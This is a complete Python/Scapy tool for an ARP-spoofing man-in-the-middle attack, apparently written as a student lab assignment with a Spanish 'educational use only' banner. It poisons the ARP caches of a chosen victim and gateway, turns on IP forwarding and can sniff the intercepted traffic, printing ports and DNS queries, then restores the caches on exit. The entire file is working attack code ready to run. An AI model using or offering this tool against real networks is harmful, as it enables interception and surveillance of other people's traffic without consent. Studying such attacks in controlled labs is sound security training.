#!/usr/bin/env python3
"""
ARP MitM Attack - Matricula 2025-0719
"""
import os
import sys
import time
import signal
import argparse
import threading

from scapy.all import Ether, ARP, srp, send, sniff, IP, TCP, UDP, DNS, conf, get_if_hwaddr

RED    = "\033[91m"
GREEN  = "\033[92m"
YELLOW = "\033[93m"
CYAN   = "\033[96m"
RESET  = "\033[0m"
BOLD   = "\033[1m"

BANNER = f"""
{RED}{BOLD}
╔══════════════════════════════════════════════════════════════╗
║         ARP MitM ATTACK TOOL  -  Matricula: 2025-0719        ║
║        SOLO PARA USO EDUCATIVO EN LABORATORIO CONTROLADO     ║
╚══════════════════════════════════════════════════════════════╝
{RESET}"""

packets_sent     = 0
packets_captured = 0
poisoning_active = True


def signal_handler(sig, frame):
    global poisoning_active
    poisoning_active = False
    print(f"\n{YELLOW}[!] Deteniendo ataque...{RESET}")


def enable_ip_forwarding():
    try:
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
            f.write("1")
        print(f"{GREEN}[+] IP Forwarding habilitado{RESET}")
    except Exception as e:
        print(f"{RED}[!] No se pudo habilitar IP forwarding: {e}{RESET}")


def disable_ip_forwarding():
    try:
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
            f.write("0")
        print(f"{YELLOW}[*] IP Forwarding deshabilitado{RESET}")
    except Exception:
        pass


def get_mac(ip, iface):
    conf.verb = 0
    pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
    answered, _ = srp(pkt, iface=iface, timeout=2, retry=3)
    if answered:
        return answered[0][1].hwsrc
    return None


def poison_arp(target_ip, target_mac, spoof_ip, iface):
    global packets_sent
    attacker_mac = get_if_hwaddr(iface)
    pkt = ARP(
        op    = 2,
        pdst  = target_ip,
        hwdst = target_mac,
        psrc  = spoof_ip,
        hwsrc = attacker_mac
    )
    send(pkt, iface=iface, verbose=False)
    packets_sent += 1


def restore_arp(target_ip, target_mac, source_ip, source_mac, iface):
    pkt = ARP(
        op    = 2,
        pdst  = target_ip,
        hwdst = target_mac,
        psrc  = source_ip,
        hwsrc = source_mac
    )
    send(pkt, iface=iface, count=5, verbose=False)
    print(f"{GREEN}[+] ARP restaurado para {target_ip}{RESET}")


def packet_sniffer(victim_ip, gateway_ip):
    global packets_captured

    def process_packet(pkt):
        global packets_captured
        if IP in pkt:
            src = pkt[IP].src
            dst = pkt[IP].dst
            if (src == victim_ip or dst == victim_ip):
                packets_captured += 1
                proto = "?"
                info  = ""
                if TCP in pkt:
                    proto = "TCP"
                    info  = f"puerto {pkt[TCP].sport} -> {pkt[TCP].dport}"
                elif UDP in pkt:
                    proto = "UDP"
                    info  = f"puerto {pkt[UDP].sport} -> {pkt[UDP].dport}"
                    if DNS in pkt and pkt[DNS].qr == 0:
                        try:
                            info += f" DNS: {pkt[DNS].qd.qname.decode()}"
                        except Exception:
                            pass
                print(f"{CYAN}[CAPTURA #{packets_captured}]{RESET} "
                      f"{src} -> {dst} | {proto} {info}")

    sniff(filter=f"host {victim_ip}", prn=process_packet,
          store=False, stop_filter=lambda p: not poisoning_active)


def run_attack(iface, victim_ip, gateway_ip, interval, do_sniff):
    global poisoning_active, packets_sent

    print(f"{CYAN}[*] Resolviendo MACs...{RESET}")
    victim_mac  = get_mac(victim_ip, iface)
    gateway_mac = get_mac(gateway_ip, iface)

    if not victim_mac:
        print(f"{RED}[!] No se pudo obtener MAC de {victim_ip}{RESET}")
        sys.exit(1)
    if not gateway_mac:
        print(f"{RED}[!] No se pudo obtener MAC de {gateway_ip}{RESET}")
        sys.exit(1)

    attacker_mac = get_if_hwaddr(iface)

    print(f"\n{GREEN}[+] Configuracion:{RESET}")
    print(f"    Atacante : {attacker_mac}")
    print(f"    Victima  : {victim_mac}  ({victim_ip})")
    print(f"    Gateway  : {gateway_mac}  ({gateway_ip})")
    print(f"\n{YELLOW}[*] Iniciando envenenamiento ARP... (Ctrl+C para detener){RESET}\n")

    enable_ip_forwarding()

    if do_sniff:
        t = threading.Thread(target=packet_sniffer,
                             args=(victim_ip, gateway_ip), daemon=True)
        t.start()
        print(f"{CYAN}[*] Sniffer iniciado{RESET}\n")

    try:
        while poisoning_active:
            poison_arp(victim_ip,  victim_mac,  gateway_ip, iface)
            poison_arp(gateway_ip, gateway_mac, victim_ip,  iface)
            if packets_sent % 10 == 0:
                print(f"{GREEN}[+]{RESET} Paquetes ARP enviados: {packets_sent}", end="\r")
            time.sleep(interval)
    except KeyboardInterrupt:
        pass
    finally:
        print(f"\n{YELLOW}[*] Restaurando ARP...{RESET}")
        restore_arp(victim_ip,  victim_mac,  gateway_ip, gateway_mac, iface)
        restore_arp(gateway_ip, gateway_mac, victim_ip,  victim_mac,  iface)
        disable_ip_forwarding()
        print(f"{GREEN}[+] Total paquetes enviados : {packets_sent}{RESET}")
        print(f"{GREEN}[+] Total paquetes capturados: {packets_captured}{RESET}")


def parse_args():
    parser = argparse.ArgumentParser(description="ARP MitM - Matricula 2025-0719")
    parser.add_argument("-i", "--iface",    required=True, help="Interfaz (ej: eth1)")
    parser.add_argument("-v", "--victim",   required=True, help="IP victima (ej: 20.25.7.10)")
    parser.add_argument("-g", "--gateway",  required=True, help="IP gateway (ej: 20.25.7.1)")
    parser.add_argument("-t", "--interval", type=float, default=2.0, help="Intervalo ARP (default: 2s)")
    parser.add_argument("--sniff",          action="store_true", help="Capturar trafico interceptado")
    return parser.parse_args()


if __name__ == "__main__":
    print(BANNER)
    signal.signal(signal.SIGINT, signal_handler)

    if os.geteuid() != 0:
        print(f"{RED}[!] Requiere root: sudo python3 {sys.argv[0]}{RESET}")
        sys.exit(1)

    args = parse_args()
    run_attack(args.iface, args.victim, args.gateway, args.interval, args.sniff)
